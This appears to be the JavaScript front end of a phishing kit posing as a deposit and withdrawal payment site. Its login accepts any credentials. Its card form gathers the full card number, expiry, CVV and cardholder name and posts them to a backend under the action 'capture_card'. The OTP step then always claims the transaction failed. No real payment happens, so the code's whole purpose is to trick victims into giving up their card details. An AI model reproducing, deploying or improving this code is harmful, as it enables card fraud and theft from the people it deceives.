let currentUser = null;
let isDeposit = true;

// Tab switching
function showTab(tab) {
    document.querySelectorAll('.auth-form').forEach(form => form.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    
    if (tab === 'login') {
        document.getElementById('loginForm').classList.add('active');
        document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
    } else {
        document.getElementById('signupForm').classList.add('active');
        document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
    }
}

// Auth forms
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    
    // Simulate auth delay
    setTimeout(() => {
        currentUser = { email, name: email.split('@')[0] };
        document.getElementById('userName').textContent = `Welcome, ${currentUser.name}!`;
        showPage('dashboard');
    }, 1500);
});

document.getElementById('signupForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const name = document.getElementById('signupName').value;
    const email = document.getElementById('signupEmail').value;
    const password = document.getElementById('signupPassword').value;
    const confirm = document.getElementById('signupConfirm').value;
    
    if (password !== confirm) {
        alert('Passwords do not match!');
        return;
    }
    
    currentUser = { email, name };
    document.getElementById('userName').textContent = `Welcome, ${name}!`;
    showPage('dashboard');
});

// Page navigation
function showPage(page) {
    document.querySelectorAll('.modal, .dashboard, .card-page, .otp-page').forEach(el => el.classList.add('hidden'));
    document.getElementById(page).classList.remove('hidden');
}

function goToDeposit() {
    isDeposit = true;
    document.getElementById('cardTitle').textContent = 'Deposit Funds';
    showPage('cardPage');
}

function goToWithdraw() {
    isDeposit = false;
    document.getElementById('cardTitle').textContent = 'Withdraw Funds';
    showPage('cardPage');
}

function goBackToDashboard() {
    showPage('dashboard');
}

function goBackToCard() {
    showPage('cardPage');
}

// Card form formatting
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
    let matches = value.match(/\d{4,16}/g);
    let match = matches && matches[0] || '';
    let parts = [];
    
    for (let i = 0, len = match.length; i < len; i += 4) {
        parts.push(match.substring(i, i + 4));
    }
    
    if (parts.length) {
        e.target.value = parts.join(' ');
    } else {
        e.target.value = value;
    }
});

document.getElementById('expiry').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0,2) + '/' + value.substring(2,4);
    }
    e.target.value = value;
});

// Card form submission
document.getElementById('cardForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const cardData = {
        type: isDeposit ? 'Deposit' : 'Withdraw',
        cardNumber: document.getElementById('cardNumber').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        cardholder: document.getElementById('cardName').value,
        amount: document.getElementById('amount').value,
        user: currentUser?.email || 'unknown',
        timestamp: new Date().toISOString()
    };
    
    // Send to backend
    fetch('backend.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'capture_card', data: cardData })
    }).then(() => {
        showPage('otpPage');
    });
});

// OTP form
document.getElementById('otpForm').addEventListener('submit', function(e) {
    e.preventDefault();
    alert('Transaction failed: Invalid OTP. Please try again.');
    showPage('dashboard');
});

// Auto-focus OTP inputs
document.querySelectorAll('.otp-input').forEach((input, index, arr) => {
    input.addEventListener('input', function() {
        if (this.value.length === 1 && index < arr.length - 1) {
            arr[index + 1].focus();
        }
    });
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && index > 0) {
            arr[index - 1].focus();
        }
    });
});
